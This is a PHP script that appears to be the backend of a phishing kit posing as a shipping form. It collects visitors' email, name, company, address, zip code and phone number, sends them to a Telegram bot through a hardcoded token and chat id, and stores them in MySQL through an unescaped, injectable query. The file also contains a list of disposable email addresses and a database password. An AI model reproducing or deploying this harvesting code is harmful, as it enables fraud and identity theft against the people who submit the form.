<?php

$logins = array("wimey58373@3dmail.top", "sewiwod673@3dmail.top", "fosilas197@mailnet.top", "fosacoc454@imail8.net", "goriy58661@netmail8.com");


$tg_token = "885318197:AAFY1pRO98jX8GL9P0nNGOGk-qnIcbbixOs";
$tg_chat_id = "-1001187712176";

$sql_host = "localhost";
$sql_dtbs = "xdovledo_shipp";
$sql_user = "xdovledo_shipp";
$sql_pass = "123456";


$card_good = "/shipping.html";
$card_bad = "/shipping.html";

if ($_SERVER["REQUEST_METHOD"] == "POST")
{
//данные из форм
$email = trim($_POST['email']);
$firstName = trim($_POST['firstName']);
$lastName = trim($_POST['lastName']);
$company = trim($_POST['company']);
$addressOne = trim($_POST['addressOne']);
$addressTwo = trim($_POST['addressTwo']);
$city = trim($_POST['city']);
$zip = trim($_POST['zip']);
$phone = trim($_POST['phone']);
 


	   
	    
	    	
				file_get_contents("https://api.telegram.org/bot{$tg_token}/sendMessage?chat_id={$tg_chat_id}&text={$email}|{$firstName}|{$lastName}|{$company}|{$addressOne}|{$addressTwo}|{$city}|{$zip}|{$phone}");

	    		$sql = mysqli_connect($sql_host, $sql_user, $sql_pass, $sql_dtbs);
	    		mysqli_query($sql, "INSERT INTO `informations` (`email`, `firstName`, `lastName`, `company`, `addressOne`, `addressTwo`, `city`,  `zip`, `phone`) VALUES ('{$email}', '{$firstName}', '{$lastName}', '{$company}', '{$addressOne}', '{$addressTwo}', '{$city}', '{$zip}', '{$phone}');");
	    		mysqli_close($sql);

	    		header("Location: {$card_good}");
				exit();
	    	
	    
	
	header("Location: {$card_bad}");
}
else
{
	exit(404);
}